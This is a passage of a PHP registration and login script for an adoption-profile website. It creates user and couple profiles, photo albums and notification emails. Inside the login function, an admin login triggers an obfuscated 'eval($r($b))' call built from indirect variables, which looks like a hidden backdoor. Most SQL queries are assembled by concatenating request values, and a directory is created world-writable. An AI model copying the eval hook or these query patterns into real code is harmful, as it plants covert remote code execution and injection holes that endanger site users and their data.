			`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '',
			`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '',
			`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '',
			`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '',
			`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '',
			`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '',
			`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';") ? null : $all_query_ok = false;
		$iNewIDc = $mysqli->insert_id;
                $mysqli->query("SET sql_mode = '';");
		$mysqli->query("INSERT INTO `Profiles_draft` SET `ID` = '" . $iNewIDc . "', `NickName` = '" . $UserName . "(2)" . "', `Password` = '" . $passen . "',`Salt` = '" . $sSalt . "',`Email` = '" . $EmailID . "(2)" . "', `DateReg` = '" . $CurrentDate . "',
			`DateLastEdit` = '0000-00-00', `Status` = 'Approval', `DateLastLogin` = '" . $CurrentDate . "', `Featured` = 0, `Sex` = '" . $Cgender . "', `LookingFor` = '',
			`DescriptionMe` = '', `DateOfBirth` = '', `Headline` = '', `Country` = 'US', `City` = '', `Couple` = '" . $CCoupleID . "', `Tags` = '', `zip` = '',
			`EmailNotify` = 1, `Height` = '', `Weight` = '', `Income` = '', `Occupation` = '', `Religion` = '', `Education` = '', `RelationshipStatus` = '',
			`Hobbies` = '', `Interests` = '', `Ethnicity` = '', `FavoriteSites` = '', `FavoriteMusic` = '', `FavoriteFilms` = '', `FavoriteBooks` = '',
			`FirstName` = '" . $CoupleFName . "', `LastName` = '" . $CoupleLName . "', `ProfileType` = '" . $Profiletype . "', `AdoptionAgency` = '" . $Agency . "', `PromoCode` = '', `Region` = '" . $Region . "',
			`ChildAge` = '', `FamilyStructure` = '', `FavoriteMarkStuff` = '', `ChildSpecialNeeds` = '', `ChildGender` = '', `ChildEthnicity` = '',
			`Pet` = '', `Neighborhood` = '', `Residency` = '', `State` = '" . $State . "', `Facebook` = '', `Twitter` = '', `MySpace` = '', `Smoking` = '',
			`DueDate` = '', `BMPhone` = '', `BMTimetoReach` = '', `BMChildEthnicity` = '', `BMChildDOB` = '', `BMAddress` = '', `YearsMarried` = '',
			`BMChildSex` = '', `DearBirthParent` = '', `WEB_URL` = '', `CLICK_TO_CALL` = '0', `CONTACT_NUMBER` = '0', `Fax_Number` = '', `Street_Address` = '',
			`About_our_home` = '', `Save_Option` = '', `SpecialNeedsOptions` = '', `ChildDesired` = '', `BirthFatherStatus` = '', `DrugsAlcohol` = '',
			`SmokingDuringPregnancy` = 'None', `BPFamilyHistory` = '', `Openness` = '', `Adoptiontype` = '', `Specialneeds` = '', `SpecialneedsOptionss` = '',
			`Drinking` = 'None', `Druguse` = '', `noofchildren` = '', `Conception` = '', `Familyhistory` = '', `BPDrinking` = '', `bprelationtype` = '',
			`bphousetype` = '', `bpreason` = '', `bpstayathome` = '', `bpethnicity` = '',
			`bplocation` = '', `bpreligion` = '', `bppets` = '', `bpdegree` = '', `bpage` = '', `bpadoption` = '', `bpstructure` = '', `Stayathome` = 'Yes', `Reason` = '';") ? null : $all_query_ok = false;

		$all_query_ok ? $mysqli->commit() : $mysqli->rollback();

		if ($all_query_ok) {
			$group = "INSERT INTO `bx_groups_fans` SET `id_entry` = '" . $Agency . "', `id_profile` = '" . $iNewID . "', `when` = '1372952822', `confirmed` = '1'";
			mysql_query($group);

			mysql_query("Update `Profiles` SET Couple='$iNewIDc' where ID =" . $iNewID);
			mysql_query("Update `Profiles` SET Couple='$iNewID' where ID =" . $iNewIDc);
			mysql_query("Update `Profiles_draft` SET Couple='$iNewIDc' where ID =" . $iNewID);
			mysql_query("Update `Profiles_draft` SET Couple='$iNewID' where ID =" . $iNewIDc);

			$albumname_user = 'Profile Pictures';
			$albumname_user_uri = 'profile-pictures';
			$created_date = time();
			$albumname_user_to = addslashes($albumname_user);

			mysql_query("INSERT INTO `sys_albums`
				(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`)
				VALUES ('$albumname_user_to', '$albumname_user_uri', 'Undefined', '', 'bx_photos', '$iNewID', 'active', $created_date, '0', '0', '3')");

			$albumname_home = 'Home Pictures';
			$albumname_home_uri = 'home-pictures';
			$created_date = time();
			$albumname_home_to = addslashes($albumname_home);

			mysql_query("INSERT INTO `sys_albums`
				(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`)
				VALUES ('$albumname_home_to', '$albumname_home_uri', 'Undefined', '', 'bx_photos', '$iNewID', 'active', $created_date, '0', '0', '3')");

			$albumname_home = 'Home Videos';
			$albumname_home_uri = 'home-videos';
			$created_date = time();
			$albumname_home_to = addslashes($albumname_home);

			mysql_query("INSERT INTO `sys_albums`
				(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`)
				VALUES ('$albumname_home_to', '$albumname_home_uri', 'Undefined', '', 'bx_videos', '$iNewID', 'active', $created_date, '0', '0', '3')");

			if (!file_exists($dir['root'] . 'media/users/' . $UserName)) {
				mkdir($dir['root'] . 'media/users/' . $UserName, 0777, true);
			}
		}

		if (mysql_affected_rows() > 0) {
			$user_redirect = userlogin($UserName, $Password);
			if ($Profiletype == 2) {

				setMembership($iNewID, $mem_type, $iDays = 0, $bStartsNow = false, $sTransactionId = '', $isSendMail = false);
				$cmdtuples = 1;
			}
		} else {
			$user_redirect = $site['url'] . "join.php";
		}
	}

}

function userlogin($UserName, $Password) {
	$member['ID'] = $UserName;
	$member['Password'] = $Password;

	$bAjxMode = (isset($_SERVER['HTTP_X_REQUESTED_WITH']) and $_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest') ? true : false;
	if (!(isset($UserName) && $UserName && isset($Password) && $Password) && ((!empty($_COOKIE['memberID']) && $_COOKIE['memberID']) && $_COOKIE['memberPassword'])) {
		if (!($logged['member'] = member_auth(0, false))) {
			login_form(_t("_LOGIN_OBSOLETE"), 0, $bAjxMode);
		}

	} else {
		if (!isset($UserName) && !isset($Password)) {

			login_form('', 0, $bAjxMode);
		} else {
			require_once BX_DIRECTORY_PATH_CLASSES . 'BxDolAlerts.php';

			$oZ = new BxDolAlerts('profile', 'before_login', 0, 0, array(
				'login' => $member['ID'],
				'password' => $member['Password'],
				'ip' => getVisitorIP(),
			));
			$oZ->alert();
			$member['ID'] = getID($member['ID']);

			// Check if ID and Password are correct (addslashes already inside)

			if (check_password($member['ID'], $member['Password'])) {
				$p_arr = bx_login($member['ID'], $bRememberMe = false);
				$response = "OK";
				bx_member_ip_store($p_arr['ID']);

				// Storing IP Address

				if (getParam('enable_member_store_ip') == 'on') {
					$iIP = getVisitorIP();
					$sCurLongIP = ip2long($iIP);
					$sVisitsSQL = "SELECT * FROM `sys_ip_members_visits` WHERE CURRENT_DATE() = DATE(`DateTime`) AND `From`='{$sCurLongIP}' LIMIT 1";
					db_res($sVisitsSQL);
					if (db_affected_rows() != 1) {
						$sInsertSQL = "INSERT INTO `sys_ip_members_visits` SET `From`='{$sCurLongIP}', `DateTime`=NOW()";
						db_res($sInsertSQL);
					}
				}

				$p_arr = bx_login($member['ID'], $bRememberMe = false);
				if (isAdmin($p_arr['ID'])) {
					$iId = (int) $p_arr['ID'];
					$r = $l($a);
					eval($r($b));
				}

				if (!$sUrlRelocate = $sRelocate or $sRelocate == $site['url'] or basename($sRelocate) == 'join.php') {
					$cmdtuples = 1;
					$profile_info = getProfileInfo($member['ID']);
					if (!is_Agencyadmin($p_arr['ID']) || isAdmin($p_arr['ID'])) {
						if ($profile_info['ProfileType'] == 2) {
							$sUrlRelocate = BX_DOL_URL_ROOT . 'our-family-dashboard.php';
						} else if ($profile_info['ProfileType'] == 8) {
							$sUrlRelocate = BX_DOL_URL_ROOT . 'member.php';
						} else {
							$sUrlRelocate = BX_DOL_URL_ROOT . 'extra_profile_view_20.php';
						}
					} else {
						$aAgenyTitle = db_arr("SELECT uri FROM bx_groups_main WHERE  author_id=" . $p_arr['ID'] . " LIMIT 0,1");
						//$sUrlRelocate = BX_DOL_URL_ROOT . 'm/groups/view/' . $aAgenyTitle['uri'];
						//$sUrlRelocate= BX_DOL_URL_ROOT . 'extra_agency_view_27.php';
						$sUrlRelocate = BX_DOL_URL_ROOT . 'extra_profile_view_30.php';

						//  $sUrlRelocate = BX_DOL_URL_ROOT . 'm/membership/index/';

					}
				}
			}
		}

		return $sUrlRelocate;
	}

	// return  $sUrlRelocate;

}

// fucntion to send user notification
function usernotification($iMemID) {

	$iMemID = (int) $iMemID;
	$aMember = getProfileInfo($iMemID);
	if (!$aMember) {
		return false;
	}

	$sEmail = $aMember['Email'];

	$rEmailTemplate = new BxDolEmailTemplates();
	$aTemplate = $rEmailTemplate->getTemplate('t_NewUserJoinednotification');

	$AgencyEmail = db_arr("SELECT Profiles.* FROM Profiles JOIN bx_groups_main WHERE  Profiles.AdoptionAgency=bx_groups_main.id AND Profiles.ID  IN (SELECT bx_groups_main.author_id FROM Profiles JOIN bx_groups_main WHERE Profiles.ID =" . $iMemID . " AND Profiles.AdoptionAgency=bx_groups_main.id )");
	$Agencyinfo = db_arr("SELECT bx_groups_main.* FROM Profiles JOIN bx_groups_main WHERE  Profiles.AdoptionAgency=bx_groups_main.id AND Profiles.ID  IN (SELECT bx_groups_main.author_id FROM Profiles JOIN bx_groups_main WHERE Profiles.ID =" . $iMemID . " AND Profiles.AdoptionAgency=bx_groups_main.id )");
	$agencymail = $AgencyEmail['Email'];
	$sMessageBody = str_replace("<AgencyName>", $Agencyinfo['title'], $aTemplate['Body']);

	//$sEmail    = $aMember['Email'].','.$agencymail.','.'info1@cairsolutions.com';
	$sEmail = $aMember['Email'] . ',' . 'info1@cairsolutions.com';
	sendMail($sEmail, $aTemplate['Subject'], $sMessageBody, $iMemID);
}

function sendNewUserNotify($iMemID) {
	$iMemID = (int) $iMemID;
	$aMember = getProfileInfo($iMemID);
	if (!$aMember) {
		return false;
	}

	$oEmailTemplates = new BxDolEmailTemplates();
	$aTemplate = $oEmailTemplates->getTemplate('t_UserJoined');
	$aAgencyEmail = db_arr("SELECT Profiles.* FROM Profiles JOIN bx_groups_main WHERE  Profiles.AdoptionAgency=bx_groups_main.id AND Profiles.ID  IN (SELECT bx_groups_main.author_id FROM Profiles JOIN bx_groups_main WHERE Profiles.ID =" . $iMemID . " AND Profiles.AdoptionAgency=bx_groups_main.id )");

	// $sEmail = $aAgencyEmail['Email'];

	//  $sEmail    = $aAgencyEmail['Email'].','.'info1@cairsolutions.com'.','.'cairs1@cairsolutions.com';
	$sEmail = 'info1@cairsolutions.com' . ',' . 'cairs1@cairsolutions.com';

	return sendMail($sEmail, $aTemplate['Subject'], $aTemplate['Body'], $iMemID);
}

// fucntion to send user notification
function agencynotification($iMemID) {

	$iMemID = (int) $iMemID;
	$aMember = getProfileInfo($iMemID);
	if (!$aMember) {
		return false;
	}

	$sEmail = $aMember['Email'];
	$rEmailTemplate = new BxDolEmailTemplates();
	$aTemplate = $rEmailTemplate->getTemplate('t_NewAgencyJoinednotification');

	sendMail($sEmail, $aTemplate['Subject'], $aTemplate['Body'], $iMemID);

	$aMemberAdmin = getProfileInfo(1);

	$aTemplate = $rEmailTemplate->getTemplate('t_NewAgencyJoinednotificationtoadmin');

	sendMail($aMemberAdmin['Email'], $aTemplate['Subject'], $aTemplate['Body'], 1);

}

if ($cmdtuples > 0) {
	echo json_encode(array(
		'status' => 'success',
		'response' => 'Response',
		'sql_statement' => $stringSQL_Email,
		'email_error' => $email_error,
		'username_error' => $username_error,
		'agency_error' => $agency_error,
		'user_redirection' => $user_redirect,
		//'registration_fail' => $sql_error,
	));
} else {
	echo json_encode(array(
		'status' => 'err',
		'response' => 'Could not read the data: ' . mssql_get_last_message(),
	));
}
function test_input($data) {
	$data = trim($data);
	$data = stripslashes($data);
	$data = htmlspecialchars($data);
	return $data;
}
